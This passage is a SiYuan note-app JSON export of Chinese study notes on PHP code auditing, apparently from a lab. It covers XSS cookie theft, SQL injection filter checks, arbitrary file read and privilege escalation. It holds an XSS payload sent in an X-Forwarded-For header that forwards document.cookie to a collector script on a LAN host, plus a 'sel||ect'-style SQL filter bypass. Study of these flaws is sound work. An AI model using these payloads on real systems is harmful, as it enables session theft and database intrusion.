ype":"NodeParagraph","Properties":{"id":"20240927111732-1apnpz5","updated":"20240927112423"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-8an1vp7","Type":"NodeParagraph","Properties":{"id":"20240927111732-8an1vp7","updated":"20240927112436"}},{"ID":"20240927111732-olgbypt","Type":"NodeParagraph","Properties":{"id":"20240927111732-olgbypt","updated":"20240927112444"}},{"ID":"20240927111732-g08oj4v","Type":"NodeParagraph","Properties":{"id":"20240927111732-g08oj4v","updated":"20240927112528"}},{"ID":"20240927111732-93vi0zo","Type":"NodeParagraph","Properties":{"id":"20240927111732-93vi0zo","updated":"20240927112611"}},{"ID":"20240927111732-3nzetti","Type":"NodeParagraph","Properties":{"id":"20240927111732-3nzetti","updated":"20240927112642"}},{"ID":"20240927111732-m0u9uel","Type":"NodeParagraph","Properties":{"id":"20240927111732-m0u9uel","updated":"20240927112704"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-0uu9nhq","Type":"NodeParagraph","Properties":{"id":"20240927111732-0uu9nhq","updated":"20240927112747"}},{"ID":"20240927111732-lb8rd8t","Type":"NodeParagraph","Properties":{"id":"20240927111732-lb8rd8t","updated":"20240927112755"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-3rw3tdi","Type":"NodeParagraph","Properties":{"id":"20240927111732-3rw3tdi","updated":"20240927112804"}},{"ID":"20240927111732-fc0hat9","Type":"NodeParagraph","Properties":{"id":"20240927111732-fc0hat9","updated":"20240927112808"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-5do50lm","Type":"NodeParagraph","Properties":{"id":"20240927111732-5do50lm","updated":"20240927112815"}},{"ID":"20240927111732-htepak7","Type":"NodeParagraph","Properties":{"id":"20240927111732-htepak7","updated":"20240927112834"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-78p6msu","Type":"NodeParagraph","Properties":{"id":"20240927111732-78p6msu","updated":"20240927112911"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240927111732-ofyfbcx","Type":"NodeParagraph","Properties":{"id":"20240927111732-ofyfbcx","updated":"20240927112918"}},{"ID":"20240927111732-bujh38v","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927111732-bujh38v","updated":"20240927111732"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"坑位"}]},{"ID":"20240927111732-xdtsscd","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-xdtsscd","updated":"20240927113033"},"Children":[{"ID":"20240927113033-kag8nop","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927113033-kag8nop","updated":"20240927113033"},"Children":[{"ID":"20240927113033-ux4ykwh","Type":"NodeParagraph","Properties":{"id":"20240927113033-ux4ykwh","updated":"20240927113033"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"坑一："}]}]}]},{"ID":"20240927111732-s1kffmi","Type":"NodeParagraph","Properties":{"id":"20240927111732-s1kffmi","updated":"20240927113036"},"Children":[{"Type":"NodeText","Data":"\t最开始只用了zy.php文件 抓包插入的一句话"}]},{"ID":"20240927113047-72zfoqu","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927113047-72zfoqu","updated":"20240927113050"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"\tX-Forwarded-For:\u003cscript\u003ewindow.location=“http://192.168.43.227/zy.php?cookie”=+document.cookie\u003c/script\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240927111732-tyzhnnv","Type":"NodeParagraph","Properties":{"id":"20240927111732-tyzhnnv","updated":"20240927113100"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"\t"},{"Type":"NodeText","Data":"后面发现没有生成cookie.txt文件，查看源代码发现双引号替换了，看了SQL语句里面也没有，应该是clean_input函数给清洗了​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240926203955718"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240926203955718.png?lastModify=1727406994"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927111732-di9jzgd","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111732-di9jzgd","updated":"20240927113106"},"Children":[{"ID":"20240927113106-jc1wts4","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927113106-jc1wts4","updated":"20240927113106"},"Children":[{"ID":"20240927113106-l37hfwq","Type":"NodeParagraph","Properties":{"id":"20240927113106-l37hfwq","updated":"20240927113106"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"坑二：后面有利用了html对双引号不是敏感，删除了发现调用不了"}]}]}]},{"ID":"20240927111732-wf8dwmp","Type":"NodeParagraph","Properties":{"id":"20240927111732-wf8dwmp","updated":"20240927113125"},"Children":[{"Type":"NodeText","Data":"​\t然后就使用了cookie.js文件和zy.php文件，使用cookie.js文件去绕过双引号和无法调用的限制"}]},{"ID":"20240926140004-a9dgcen","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20240926140004-a9dgcen","updated":"20240926141526"},"Children":[{"Type":"NodeText","Data":"sql注入漏洞审计"}]},{"ID":"20240926141712-3rc8x0t","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240926141712-3rc8x0t","updated":"20240926141714"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20240926141527-d5n8lhm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926141527-d5n8lhm","updated":"20240926141650"},"Children":[{"Type":"NodeText","Data":"1.先判断是否用了过滤函数（直接全局搜索） addslashes()/mysql_real_escape_string,GBK编码"}]},{"ID":"20240926141650-z1tglhd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926141650-z1tglhd","updated":"20240926141707"},"Children":[{"Type":"NodeText","Data":"2.是否存在自定义的过滤函数，看过滤规则"}]},{"ID":"20240926141722-37zglhf","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240926141722-37zglhf","updated":"20240926141727"},"Children":[{"Type":"NodeText","Data":"开始审计"}]},{"ID":"20240926141730-6s72896","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926141730-6s72896","updated":"20240926141755"},"Children":[{"Type":"NodeText","Data":"正向：根据过滤的内容来检查数据库语句以及其中的变量"}]},{"ID":"20240926141757-j3ieqmz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926141757-j3ieqmz","updated":"20240926142117"},"Children":[{"Type":"NodeText","Data":"普通：检索语句、函数、观察语句的拼接情况和变量的过滤"}]},{"ID":"20240926142122-xoq5tox","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142122-xoq5tox","updated":"20240926142158"},"Children":[{"Type":"NodeText","Data":"​​\t注意关键词："}]},{"ID":"20240926142203-uzh3d8n","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142203-uzh3d8n","updated":"20240926142205"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"select update insert from mysql_query mysql_connect database之类的数据查询语句和数据库连接函数"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926142106-mji1lkx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142106-mji1lkx","updated":"20240926142401"},"Children":[{"Type":"NodeText","Data":"举个🌰"}]},{"ID":"20240926142405-lgt0pt2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142405-lgt0pt2","updated":"20240926142619"},"Children":[{"Type":"NodeText","Data":"1.参数不可控"}]},{"ID":"20240926142403-g2oa6t3","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142403-g2oa6t3","updated":"20240926142403"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926142403-cb9ukqx.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926142617-9l59jpy","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142617-9l59jpy","updated":"20240926142802"},"Children":[{"Type":"NodeText","Data":"2.自定义了过滤函数sqlwaf，查看相关拦截"}]},{"ID":"20240926142754-x6nz380","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142754-x6nz380"},"Children":[{"Type":"NodeText","Data":"可以sel||ect--》select绕过"}]},{"ID":"20240926142644-35agqzh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142644-35agqzh"},"Children":[{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926142630-zcqi9wr.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926142910-k4kpzuw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142910-k4kpzuw","updated":"20240926142915"},"Children":[{"Type":"NodeText","Data":"构造payload"}]},{"ID":"20240926142933-hm5ttde","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926142933-hm5ttde","updated":"20240926143215"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"?id=7 an||d 1=2"},{"Type":"NodeText","Data":"​报错"}]},{"ID":"20240926143425-6rs6oby","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926143425-6rs6oby","updated":"20240926143445"},"Children":[{"Type":"NodeText","Data":"判断字段 order by "}]},{"ID":"20240926143446-7tojc56","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926143446-7tojc56","updated":"20240926143450"},"Children":[{"Type":"NodeText","Data":"巴拉巴拉"}]},{"ID":"20240926143945-4fm4kfb","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926143945-4fm4kfb","updated":"20240926143946"},"Children":[{"Type":"NodeText","Data":"3."}]},{"ID":"20240926143451-azzmmn9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926143451-azzmmn9"}},{"ID":"20240926143452-2jl5iwm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926143452-2jl5iwm"}},{"ID":"20240927090818-9z28kn5","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240927090818-9z28kn5","updated":"20240927090824"},"Children":[{"Type":"NodeText","Data":"文件上传漏洞"}]},{"ID":"20240927090500-gcahiss","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240927090500-gcahiss","updated":"20240927090503"},"Children":[{"Type":"NodeText","Data":"二次注入漏洞"}]},{"ID":"20240927090806-batx4e2","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20240927090806-batx4e2","updated":"20240927090833"},"Children":[{"Type":"NodeText","Data":"任意文件读取漏洞"}]},{"ID":"20240927090841-p3ovcv0","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240927090841-p3ovcv0","updated":"20240927090909"},"Children":[{"Type":"NodeText","Data":"产生原理"}]},{"ID":"20240927090915-genalzs","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927090915-genalzs","updated":"20240927090943"},"Children":[{"Type":"NodeText","Data":"都具有读取文件的函数"}]},{"ID":"20240927090946-aum7yie","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927090946-aum7yie","updated":"20240927091005"},"Children":[{"Type":"NodeText","Data":"读取文件的路径用户可控，且没有经过校验或过滤"}]},{"ID":"20240927091005-3716q9y","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091005-3716q9y","updated":"20240927091011"},"Children":[{"Type":"NodeText","Data":"都会输出文件内容"}]},{"ID":"20240927091011-yp0zl7t","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240927091011-yp0zl7t","updated":"20240927091020"},"Children":[{"Type":"NodeText","Data":"相关函数"}]},{"ID":"20240927091103-ml2l1tm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091103-ml2l1tm","updated":"20240927091106"},"Children":[{"Type":"NodeText","Data":"读取"}]},{"ID":"20240927091029-vnw1stn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091029-vnw1stn","updated":"20240927160153"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240927091029-lahvicc.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927091110-92cjua2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091110-92cjua2","updated":"20240927091116"},"Children":[{"Type":"NodeText","Data":"删除"}]},{"ID":"20240927091117-kjgdwcp","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091117-kjgdwcp","updated":"20240927091128"},"Children":[{"Type":"NodeText","Data":"unlink() fclose()"}]},{"ID":"20240927091129-ee4ol9c","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091129-ee4ol9c","updated":"20240927091133"},"Children":[{"Type":"NodeText","Data":"写入"}]},{"ID":"20240927091134-waguxid","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091134-waguxid","updated":"20240927091148"},"Children":[{"Type":"NodeText","Data":"fwrite()"}]},{"ID":"20240927091148-bjgaoff","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091148-bjgaoff","updated":"20240927091155"},"Children":[{"Type":"NodeText","Data":"file_put_contents()"}]},{"ID":"20240927091156-p8hrnwf","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091156-p8hrnwf","updated":"20240927091202"},"Children":[{"Type":"NodeText","Data":"fputs()"}]},{"ID":"20240927091203-he6ut17","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091203-he6ut17","updated":"20240927094018"},"Children":[{"Type":"NodeText","Data":"move_uploaded_file()"}]},{"ID":"20240927091110-aq42wb9","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240927091110-aq42wb9","updated":"20240927091431"},"Children":[{"Type":"NodeText","Data":"审计思路"}]},{"ID":"20240927091439-qrjfrbk","Type":"NodeList","ListData":{"Typ":1},"Properties":{"fold":"1","heading-fold":"1","id":"20240927091439-qrjfrbk","updated":"20240927091613"},"Children":[{"ID":"20240927091439-s6btgbv","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20240927091439-s6btgbv"},"Children":[{"ID":"20240927091433-652fyxz","Type":"NodeParagraph","Properties":{"id":"20240927091433-652fyxz","updated":"20240927091509"},"Children":[{"Type":"NodeText","Data":"找到文件读取或操作的相关函数，进行变量回溯，查看是否存在可控变量"}]}]},{"ID":"20240927091511-9n5s3bh","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20240927091511-9n5s3bh","updated":"20240927091613"},"Children":[{"ID":"20240927091511-6bhud9p","Type":"NodeParagraph","Properties":{"id":"20240927091511-6bhud9p","updated":"20240927091613"},"Children":[{"Type":"NodeText","Data":"走前端页面找到文件操作相关（读取文件）的功能点"}]}]}]},{"ID":"20240927091110-gdoile8","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091110-gdoile8"}},{"ID":"20240927091110-f459ts2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091110-f459ts2"}},{"ID":"20240927091110-ivyrzzk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091110-ivyrzzk"}},{"ID":"20240927091110-6ltpd2w","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091110-6ltpd2w"}},{"ID":"20240927091111-01mhe4k","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091111-01mhe4k"}},{"ID":"20240927091111-i9hbzph","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091111-i9hbzph"}},{"ID":"20240927091111-3di1fee","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091111-3di1fee"}},{"ID":"20240927091111-fc5tnta","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091111-fc5tnta"}},{"ID":"20240927091109-1qtc3ef","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240927091109-1qtc3ef"},"Children":[{"Type":"NodeText","Data":"​"}]},{"ID":"20240927105620-cclo34h","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240927105620-cclo34h","updated":"20240927105627"},"Children":[{"Type":"NodeText","Data":"越权漏洞"}]},{"ID":"20240927105731-lmxjskg","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927105731-lmxjskg","updated":"20240927105746"},"Children":[{"Type":"NodeText","Data":"产生原因"}]},{"ID":"20240927105752-xe22ohs","Type":"NodeParagraph","Properties":{"id":"20240927105752-xe22ohs","updated":"20240927105821"},"Children":[{"Type":"NodeText","Data":"未严格校验session，导致存在越权操作"}]},{"ID":"20240927105821-2tnz55g","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927105821-2tnz55g","updated":"20240927105824"},"Children":[{"Type":"NodeText","Data":"危害"}]},{"ID":"20240927105826-dd9sa7x","Type":"NodeParagraph","Properties":{"id":"20240927105826-dd9sa7x","updated":"20240927105829"},"Children":[{"Type":"NodeText","Data":"增删改查"}]},{"ID":"20240927105829-2u5ulz9","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927105829-2u5ulz9","updated":"20240927105833"},"Children":[{"Type":"NodeText","Data":"审计思路"}]},{"ID":"20240927105901-2yoikts","Type":"NodeList","ListData":{"Typ":1},"Properties":{"id":"20240927105901-2yoikts"},"Children":[{"ID":"20240927105901-4gj8am2","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20240927105901-4gj8am2"},"Children":[{"ID":"20240927105834-jgabhn4","Type":"NodeParagraph","Properties":{"id":"20240927105834-jgabhn4","updated":"20240927110001"},"Children":[{"Type":"NodeText","Data":"根据页面前端修改资料或常出现越权漏洞功能的源代码，检查表单提交中有没有类似id,user_id之类的身份校验参数"}]}]},{"ID":"20240927110002-iwulrhl","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20240927110002-iwulrhl"},"Children":[{"ID":"20240927110002-h6hawog","Type":"NodeParagraph","Properties":{"id":"20240927110002-h6hawog","updated":"20240927110044"},"Children":[{"Type":"NodeText","Data":"配置文件是否有过滤器，过滤用户的输入，是否修在URL"}]}]},{"ID":"20240927110046-3r69e2n","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20240927110046-3r69e2n"},"Children":[{"ID":"20240927110046-n7hjifd","Type":"NodeParagraph","Properties":{"id":"20240927110046-n7hjifd","updated":"20240927110126"},"Children":[{"Type":"NodeText","Data":"检查处理逻辑是否有身份逻辑限制，和其认证逻辑是否正常"}]}]}]},{"ID":"20240927110139-x6scl8k","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927110139-x6scl8k","updated":"20240927110145"},"Children":[{"Type":"NodeText","Data":"漏洞位置"}]},{"ID":"20240927110152-hvfo2fv","Type":"NodeList","ListData":{"Typ":1},"Properties":{"id":"20240927110152-hvfo2fv"},"Children":[{"ID":"20240927110152-zae4suk","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20240927110152-zae4suk"},"Children":[{"ID":"20240927110145-hlftsi0","Type":"NodeParagraph","Properties":{"id":"20240927110145-hlftsi0","updated":"20240927110209"},"Children":[{"Type":"NodeText","Data":"查看资料、获取文件信息的、获取图片等"}]}]},{"ID":"20240927110210-itkid1b","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20240927110210-itkid1b"},"Children":[{"ID":"20240927110210-0oy9vwt","Type":"NodeParagraph","Properties":{"id":"20240927110210-0oy9vwt","updated":"20240927110232"},"Children":[{"Type":"NodeText","Data":"修改资料、修改密码、重置密码、找回密码的功能点"}]}]},{"ID":"20240927110233-ogstchy","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20240927110233-ogstchy"},"Children":[{"ID":"20240927110233-dj2zvkb","Type":"NodeParagraph","Properties":{"id":"20240927110233-dj2zvkb","updated":"20240927110239"},"Children":[{"Type":"NodeText","Data":"账户权限操作的地方"}]}]}]},{"ID":"20240927110239-7goedz3","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240927110239-7goedz3","updated":"20240927110258"},"Children":[{"Type":"NodeText","Data":"栗子🌰"}]},{"ID":"20240927110259-6yzvr6g","Type":"NodeParagraph","Properties":{"id":"20240927110259-6yzvr6g"}}]}